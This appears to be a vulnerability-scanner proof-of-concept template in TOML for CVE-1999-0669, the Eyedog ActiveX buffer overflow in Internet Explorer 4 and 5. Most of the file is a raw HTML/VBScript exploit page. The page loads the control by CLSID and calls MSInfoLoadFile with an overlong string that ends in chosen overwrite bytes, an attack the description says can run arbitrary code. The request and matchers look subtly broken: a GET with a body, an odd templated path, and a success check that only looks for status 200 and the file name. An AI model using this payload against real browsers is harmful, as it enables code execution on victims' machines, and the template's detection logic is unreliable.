[info]
author = "ave"
description = "验证 Microsoft Internet Explorer 4.0/5.0 中 Eyedog ActiveX 控件缓冲区溢出漏洞。通过构造包含 object 标签（CLSID:06A7EC63-4E21-11D0-A112-00A0C90543AA）的恶意 HTML 页面，调用 MSInfoLoadFile 方法传入超长字符串触发溢出，导致浏览器崩溃或执行任意代码。"
id = "POC-AVE-1999-0196"
name = "Microsoft Internet Explorer 4/5 Eyedog ActiveX Remote Overflow PoC"
severity = "medium"
tags = ["ave-1999-0196"]
vuln_id = [
    "CVE-1999-0669",
    "AVE-1999-0196",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/eyedog-poc.html"
protocol = "http"

[poc.requests.body]
content = """
<html>
<body>
<object classid="clsid:06A7EC63-4E21-11D0-A112-00A0C90543AA" id="eye"></object>
<script language="vbscript">
expstr = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
expstr = expstr + Chr(202) + Chr(212) + Chr(248) + Chr(191)
eye.MSInfoLoadFile(expstr)
</script>
</body>
</html>
"""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["eyedog-poc.html"]
